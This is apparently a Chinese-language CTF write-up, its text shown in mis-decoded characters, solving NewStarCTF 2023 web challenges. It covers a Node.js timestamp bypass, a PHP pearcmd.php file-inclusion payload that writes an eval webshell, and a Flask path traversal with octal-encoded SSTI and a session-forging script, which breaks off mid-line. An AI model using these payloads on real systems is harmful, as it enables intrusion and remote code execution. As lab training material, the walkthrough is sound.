<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">dst, src</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> dst !== <span class="string">&quot;object&quot;</span> || <span class="keyword">typeof</span> src !== <span class="string">&quot;object&quot;</span>) <span class="keyword">return</span> dst;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> dst &amp;&amp; key <span class="keyword">in</span> src) &#123;</span><br><span class="line">            dst[key] = <span class="title function_">merge</span>(dst[key], src[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dst[key] = src[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‘ç°æœ‰mergeå‡½æ•°ï¼Œå…¸å‹çš„åŸå‹é“¾æ±¡æŸ“</p>
<p>æˆ‘ä»¬å›åˆ°info.jsï¼Œæ³¨æ„åˆ°ä¸€ä¸ªé‡è¦éƒ¨åˆ†</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getInfo</span>(<span class="params">timestamp</span>) &#123;</span><br><span class="line">    timestamp = <span class="keyword">typeof</span> timestamp === <span class="string">&quot;number&quot;</span> ? timestamp : <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="comment">// Remove test data from before the movie was released</span></span><br><span class="line">    <span class="keyword">let</span> minTimestamp = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="variable constant_">CONFIG</span>.<span class="property">min_public_time</span> || <span class="variable constant_">DEFAULT_CONFIG</span>.<span class="property">min_public_time</span>).<span class="title function_">getTime</span>();</span><br><span class="line">    timestamp = <span class="title class_">Math</span>.<span class="title function_">max</span>(timestamp, minTimestamp);</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> sql.<span class="title function_">all</span>(<span class="string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®æ³¨é‡Šï¼ŒçŒœæµ‹flagåœ¨æµ‹è¯•çš„æ•°æ®ä¸­</p>
<p>ç„¶åè¿™é‡Œè·å–sqlæ•°æ®çš„æ¡ä»¶æ˜¯ä¸æ—©äºå½“å‰æ—¶é—´ï¼Œå› æ­¤æƒ³è¦è·å–æ•°æ®ï¼Œå°±éœ€è¦æŠŠæ—¶é—´è°ƒæ—©ä¸€ç‚¹ï¼ˆå› ä¸ºè¿”å›çš„æ•°æ®éƒ½æ˜¯æ™šäºæœ€å°å…¬å¼€æ—¶é—´çš„ï¼‰</p>
<p>å…ˆæ‰¾æ‰¾æœ€å°å…¬å¼€æ—¶é—´åœ¨å“ª</p>
<p>è¿½è¸ªä¸€ä¸‹ä¸configç›¸å…³çš„ä¸¤ä¸ªæ–‡ä»¶</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">app_name</span>: <span class="string">&quot;OtenkiGirl&quot;</span>,</span><br><span class="line">    <span class="attr">default_lang</span>: <span class="string">&quot;ja&quot;</span>,</span><br><span class="line">    <span class="attr">min_public_time</span>: <span class="string">&quot;2019-07-09&quot;</span>,</span><br><span class="line">    <span class="attr">server_port</span>: <span class="number">9960</span>,</span><br><span class="line">    <span class="attr">webpack_dev_port</span>: <span class="number">9970</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é‚£æˆ‘ä»¬çš„æ—¶é—´åªè¦è°ƒåˆ°2019.07.09ä¹‹å‰å°±è¡Œ</p>
<p>æŠ“åŒ…æ„é€ ä¸€ä¸‹</p>
<img src="/2024/03/29/buuctf/buu2/image-20240407154842296.png" class="" title="image-20240407154842296">

<p>åˆ·æ–°ä¸€ä¸‹ç•Œé¢ï¼Œå‘ç°æœ‰è¿œå¤æ—¶æœŸçš„æ ‡ç­¾ï¼Œé‚£å°±å»çœ‹ä¸€çœ‹</p>
<p>ç›´æ¥hackbaréšä¾¿postä¸€ä¸ªæ•°æ®ç„¶åè®¿é—®å°±è¡Œï¼ˆä¹‹å‰æåˆ°æœ‰ä¸€ä¸ªè·¯å¾„åè¿‡æ»¤ï¼Œåªè¦ä¼ æ•°å­—å°±è¡Œäº†ï¼‰</p>
<img src="/2024/03/29/buuctf/buu2/image-20240407155208222.png" class="" title="image-20240407155208222">

<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Include-ğŸ"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Include-ğŸ" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Include ğŸ"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Include ğŸ</h1><p>æ ¹æ®é¢˜ç›®æè¿°æ˜¯è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p>å…ˆæ‰¾æ‰¾ç¯å¢ƒå˜é‡æœ‰æ²¡æœ‰flag</p>
<img src="/2024/03/29/buuctf/buu2/image-20240407155551600.png" class="" title="image-20240407155551600">

<p>æç¤ºæˆ‘ä»¬å»æŸ¥çœ‹<code>register_argc_argv</code></p>
<p>å‘ç°ç›¸å…³åŠŸèƒ½å¤„äºOnçŠ¶æ€ï¼Œç„¶åå†æ ¹æ®æ ‡é¢˜ï¼ŒçŒœæµ‹æ˜¯è¦åˆ©ç”¨<code>pearcmd.php</code>è¿›è¡Œæ–‡ä»¶åŒ…å«</p>
<h2 id="register-argc-argvçš„ç®€å•ä½œç”¨"><a href="#register-argc-argvçš„ç®€å•ä½œç”¨" class="headerlink" title="register_argc_argvçš„ç®€å•ä½œç”¨"></a>register_argc_argvçš„ç®€å•ä½œç”¨</h2><p>å®ƒå¯ä»¥é€šè¿‡<code>$_SERVER[&#39;argv&#39;]</code>è·å–å‘½ä»¤è¡Œå‚æ•°ï¼Œæ‰€ä»¥ä½ ä¼šçœ‹åˆ°å®ƒç°åœ¨çš„æ•°æ®æ˜¯è¿™æ ·çš„</p>
<img src="/2024/03/29/buuctf/buu2/image-20240407160952705.png" class="" title="image-20240407160952705">

<p>åœ¨webç¯å¢ƒä¸‹ï¼Œå¦‚æœæƒ³è¦è·å–å¤šä¸ªå‚æ•°ï¼Œåˆ™éœ€è¦ç”¨+æŠŠä¸åŒå˜é‡åˆ†éš”å¼€æ¥ï¼ˆè¿™é‡Œæˆ‘æ‡’å¾—å¤ç°äº†ï¼‰</p>
<h2 id="pearcmd-phpçš„ç®€å•è®²è¿°"><a href="#pearcmd-phpçš„ç®€å•è®²è¿°" class="headerlink" title="pearcmd.phpçš„ç®€å•è®²è¿°"></a>pearcmd.phpçš„ç®€å•è®²è¿°</h2><p>pearæ–‡ä»¶ä¸­ç”¨åˆ°äº†pearcmd.phpæ–‡ä»¶ï¼Œå¯ä»¥å…ˆçœ‹çœ‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readPHPArgv</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$argv</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$argv</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_array</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_array</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> PEAR::<span class="title function_ invoke__">raiseError</span>(<span class="string">&quot;Console_Getopt: &quot;</span> . <span class="variable">$msg</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$argv</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$_SERVER[&#39;argv&#39;]</code>å¯æ§ï¼Œæ¯•ç«Ÿæˆ‘ä»¬æ˜¯è¦ä¼ å‚æ•°ä¸Šå»çš„</p>
<p>:::info</p>
<p>pearä¸€èˆ¬é»˜è®¤å®‰è£…åœ¨<code>/usr/local/lib/php</code>ï¼Œä¸åŒç³»ç»Ÿçš„å®‰è£…ç›®å½•å¯èƒ½ä¸åŒ</p>
<p>:::</p>
<p>å‡ ä¸ªä½¬å¯¹å®ƒçš„è¯¦ç»†è¯´æ˜æˆ‘æ”¾åœ¨è¿™äº†ï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52988816/article/details/127078373">dalao1</a>ï¼Œ<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">dalao2</a></p>
<p>ä¸Šæ‰‹ï¼</p>
<p>pearå‘½ä»¤ä¸­æœ‰ä¸€ä¸ª<code>config_create</code>ï¼Œæ ¹æ®æ ¼å¼<code>pear config-create [options] &lt;root path&gt; &lt;filename&gt;</code>å¯ä»¥è¿™æ ·æ„é€ ï¼š</p>
<p><code>?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_POST[1]);?&gt;+/var/www/html/a.php</code></p>
<p>:::danger no-icon</p>
<p>è‡³äºä¸ºä»€ä¹ˆæœ‰ä¸ª/&amp;å’Œ&amp;/ï¼Œæˆ‘æƒ³åº”è¯¥æ˜¯æ ¼å¼è¦æ±‚çš„å§</p>
<p>è‡³äºä¸ºä»€ä¹ˆèƒ½ç›´æ¥ç”¨config-createï¼Œæˆ‘æƒ³åº”è¯¥æ˜¯ä¹‹å‰è¯´åˆ°çš„<code>register_argc_argv</code>å¯¼è‡´çš„å§ï¼Œæ¯•ç«Ÿæ˜¯èƒ½ç›´æ¥æŠŠä¼ å…¥çš„æ•°æ®ä½œä¸ºå‚æ•°ä¼ é€’</p>
<p>:::</p>
<p>è¿™æ ·ä¸‹æ¥æ„é€ åï¼Œå¤§è‡´æ„æ€å°±æ˜¯ï¼šé€šè¿‡pearå‘½ä»¤<code>config-create</code>ï¼Œæ¥åŒ…å«<code>/usr/local/lib/php/pearcmd.cmd</code>æ–‡ä»¶ï¼Œæœ¨é©¬å†™å…¥åˆ°<code>a.php</code>ä¸­</p>
<p>ï¼ˆæœ‰ç©ºå†å›å¤´æ¥è¯´è¯´ä¸ºä»€ä¹ˆè¿™ä¹ˆå†™ï¼‰</p>
<p>ç„¶åè®¿é—®a.phpä¼ å‚</p>
<img src="/2024/03/29/buuctf/buu2/image-20240407174939025.png" class="" title="image-20240407174939025">

<p>:::danger</p>
<p>è¿™é‡Œè¿™é‡Œä¸€å®šè¦ç”¨æŠ“åŒ…æ”¾åŒ…çš„æ–¹å¼å»ä¼ ï¼Œè€Œä¸”å¿…é¡»è¦æŠŠè¢«ç¼–ç çš„å­—ç¬¦ç»™è¿˜åŸå›æ¥ï¼Œä¸ç„¶phpæ–‡ä»¶æ ¹æœ¬æ‰§è¡Œä¸äº†</p>
<p>:::</p>
<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-InjectMe"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-InjectMe" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]InjectMe"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]InjectMe</h1><p>ç‚¹å‡»å›¾ç‰‡å‘ç°å¯ä»¥è·³è½¬</p>
<p>æŸ¥çœ‹110.jpg</p>
<img src="/2024/03/29/buuctf/buu2/image-20240418133152175.png" class="" title="image-20240418133152175">

<p>æœ‰ä¸ªå¯¹<code>.</code>çš„è¿‡æ»¤ï¼Œç”±äºæ²¡æœ‰å¾ªç¯æ£€æµ‹ï¼Œå› æ­¤å¯ä»¥è€ƒè™‘åŒå†™ç»•è¿‡</p>
<p>è¿›å…¥<code>download</code>è·¯ç”±ï¼Œç”±äºè·¯ç”±æ˜¯ç”±pythonå†™çš„ï¼ŒçŒœæµ‹æºç åœ¨<code>app.py</code>é‡Œé¢</p>
<p>æ ¹æ®ç»™å‡ºçš„<code>dockerfile</code>ï¼Œå‘ç°æºç å¤åˆ¶åˆ°<code>/app</code>ç›®å½•ä¸‹äº†</p>
<p>å¯ä»¥æ„é€ payloadï¼š<code>url/download?file=....//....//....//app/app.py</code></p>
<p>å¾—åˆ°æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, abort, send_file, session, render_template_string</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> secret_key</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/cancanneed&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cancanneed</span>():</span><br><span class="line">    all_filename = os.listdir(<span class="string">&#x27;./static/img/&#x27;</span>)</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;img.html&#x27;</span>, filename=filename, all_filename=all_filename)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">str</span>(os.listdir(<span class="string">&#x27;./static/img/&#x27;</span>))&#125;</span> &lt;br&gt; &lt;a href=\&quot;/cancanneed?file=1.jpg\&quot;&gt;/cancanneed?file=1.jpg&lt;/a&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        filename = filename.replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        filename = os.path.join(<span class="string">&#x27;static/img/&#x27;</span>, filename)</span><br><span class="line">        <span class="built_in">print</span>(filename)</span><br><span class="line">        <span class="keyword">if</span> (os.path.exists(filename)) <span class="keyword">and</span> (<span class="string">&quot;start&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> filename):</span><br><span class="line">            <span class="keyword">return</span> send_file(filename)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backdoor&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(session.get(<span class="string">&quot;user&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&quot;user&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">        name = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> re.findall(</span><br><span class="line">                <span class="string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,</span><br><span class="line">                name):</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(</span><br><span class="line">                <span class="string">&#x27;ç«Ÿç„¶ç»™&lt;h1&gt;%s&lt;/h1&gt;ä½ æ‰¾åˆ°äº†æˆ‘çš„åé—¨ï¼Œä½ ä¸€å®šæ˜¯ç½‘ç»œå®‰å…¨å¤§èµ›å† å†›å§ï¼ğŸ˜ &lt;br&gt; é‚£ä¹ˆ ç°åœ¨è½®åˆ°ä½ äº†!&lt;br&gt; æœ€åç¥æ‚¨ç©å¾—æ„‰å¿«!ğŸ˜&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        abort(<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_find</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">500</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">internal_server_error</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;500.html&#x27;</span>), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ ¸å¿ƒåœ¨<code>/backdoor</code>è·¯ç”±ï¼Œåº”è¯¥æ˜¯sessionä¼ å…¥è„šæœ¬è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<p>è¿™ä¸ªç®€å•ï¼Œæ‰¾åˆ°<code>secret_key</code>ç„¶åæŠŠå‘½ä»¤åŠ å¯†å°±è¡Œ</p>
<p>å¼€å¤´çœ‹åˆ°<code>secret_key</code>æ”¾å…¥äº†configæ–‡ä»¶ä¸­ï¼Œä¸‹è½½ä¸€ä¸‹configï¼š<code>download?file=....//....//....//app/config.py</code></p>
<p>å¾—åˆ°<code>secret_key = &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</code></p>
<p>ç”±äºè®¸å¤šå‘½ä»¤è¢«è¿‡æ»¤æ‰äº†ï¼Œå¯ä»¥è€ƒè™‘å…«è¿›åˆ¶ç¼–ç ç»•è¿‡</p>
<p>æœ€åˆçš„æ”»å‡»è„šæœ¬å¯ä»¥è¿™æ ·å†™ï¼š<code>&#123;&#123;x.__init__.__globals__.__getitem__.('__builtins__').__getitem__.('eval')('__import__("os").popen("ls /").read()')&#125;&#125;</code></p>
<p>æ”»å‡»è„šæœ¬åˆ†æå¦‚ä¸‹ï¼šï¼ˆ<del>gptå†™çš„</del>ï¼‰</p>
<ol>
<li><code>x.__init__.__globals__.__getitem__</code>ï¼šè¿™éƒ¨åˆ†å°è¯•è®¿é—® <code>x</code> å¯¹è±¡çš„ <code>__init__</code> æ–¹æ³•çš„å…¨å±€ä½œç”¨åŸŸã€‚<code>__init__</code> æ˜¯ Python ç±»çš„æ„é€ å‡½æ•°ï¼Œè€Œ <code>__globals__</code> æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œå­˜å‚¨äº†å‡½æ•°çš„å…¨å±€å˜é‡ã€‚</li>
<li><code>__getitem__(&#39;__builtins__&#39;)</code>ï¼šé€šè¿‡ <code>__getitem__</code> æ–¹æ³•è·å– <code>__builtins__</code> æ¨¡å—ï¼Œè¿™æ˜¯ä¸€ä¸ªåŒ…å«äº† Python æ‰€æœ‰å†…ç½®å‡½æ•°å’Œå˜é‡çš„æ¨¡å—ã€‚</li>
<li><code>__getitem__(&#39;eval&#39;)</code>ï¼šè¿›ä¸€æ­¥é€šè¿‡ <code>__getitem__</code> è·å–å†…ç½®çš„ <code>eval</code> å‡½æ•°ã€‚<code>eval</code> å‡½æ•°ç”¨äºæ‰§è¡Œä¸€ä¸ªå­—ç¬¦ä¸²è¡¨è¾¾çš„ Python è¡¨è¾¾å¼ï¼Œå¹¶è¿”å›è¡¨è¾¾å¼çš„å€¼ã€‚</li>
<li><code>eval(&#39;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#39;)</code>ï¼šé€šè¿‡ <code>eval</code> æ‰§è¡Œå­—ç¬¦ä¸²ä¸­çš„ä»£ç ã€‚è¿™æ®µä»£ç é¦–å…ˆé€šè¿‡ <code>__import__(&quot;os&quot;)</code> å¯¼å…¥ <code>os</code> æ¨¡å—ï¼Œç„¶åä½¿ç”¨ <code>os.popen(&quot;ls /&quot;)</code> æ‰§è¡Œ Unix/Linux å‘½ä»¤ <code>ls /</code>ï¼Œè¯¥å‘½ä»¤åˆ—å‡ºæ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ã€‚æœ€åï¼Œä½¿ç”¨ <code>.read()</code> æ–¹æ³•è¯»å–å‘½ä»¤çš„è¾“å‡ºç»“æœã€‚</li>
</ol>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="comment"># æŠŠè¿™ä¸ªä¸‹è½½äº†ï¼Œéœ€è¦ä½¿ç”¨é‡Œé¢çš„flask-session-cookie-manager3.py</span></span><br><span class="line"><span class="comment"># # https://github.com/noraj/flask-session-cookie-manager</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_octal_ascii</span>(<span class="params">s</span>):</span><br><span class="line">    octal_ascii = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> s:</span><br><span class="line">        char_code = <span class="built_in">ord</span>(char)</span><br><span class="line">        octal_ascii += <span class="string">&quot;\\\\&quot;</span> + <span class="built_in">format</span>(char_code, <span class="string">&#x27;03o&#x27;</span>)</span><br><span class="line">        <span class="comment"># octal_ascii += &quot;\\\\&quot; + format(char_code, &#x27;o&#x27;)    </span></span><br><span class="line">    <span class="keyword">return</span> octal_ascii</span><br><span class="line">secret_key = <span class="string">&quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;&#123;%print(7*7)%&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;&#123;%print(\&quot;\&quot;\\\\u005f\\\\u005f\&quot;\&quot;)%&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;&#123;%print(\&quot;\&quot;\\\\x5f\\\\x5f\&quot;\&quot;)%&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">eval_shell = <span class="string">&quot;\&quot;\&quot;&quot;</span>+string_to_octal_ascii(<span class="string">&quot;__import__(\&quot;os\&quot;).popen(\&quot;cat /*\&quot;).read()&quot;</span>)+<span class="string">&quot;\&quot;\&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(eval_shell)</span><br><span class="line"><span class="comment"># dockeréƒ¨ç½²&amp;windowsè¿è¡Œpayload</span></span><br><span class="line"><span class="comment"># &#123;&#123;x.__init__.__globals__.__builtins__.eval(&#x27;__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()&#x27;)&#125;&#125;</span></span><br><span class="line">payload = <span 